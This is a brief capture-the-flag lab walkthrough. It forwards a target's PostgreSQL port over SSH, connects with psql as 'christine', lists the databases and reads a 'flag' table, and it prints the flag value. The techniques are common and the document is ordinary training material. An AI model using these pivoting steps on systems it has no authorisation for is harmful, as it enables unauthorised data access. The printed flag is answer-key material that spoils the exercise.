### Command to create a port forward from our machine  to target machine.

In our target machine, there is a `psql` running but the machine doesn't have psql installed.

We will run a port forward using this command.

`ssh -L 1234:localhost:5432 christine@10.129.155.150`

and to verify, we will run `ss -tln`

We then run the `psql` from our machine to connect to the running psql at our target machine.

`psql -U christine -h localhost -p 1234`

Once we are connected we can use the `\l` command to list all the database (use this site for cheatsheet https://www.postgresqltutorial.com/postgresql-cheat-sheet/)

To choose the database use `\c secrets;` command

and to list all the tables inside the database, use `\dt`.

`secrets-# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)
`

Then to retreive the flag, we will use `SELECT * FROM flag;`

`
secrets=# select * FROM flag;
-[ RECORD 1 ]---------------------------
value | cf277664b1771217d7006acdea006db1
`


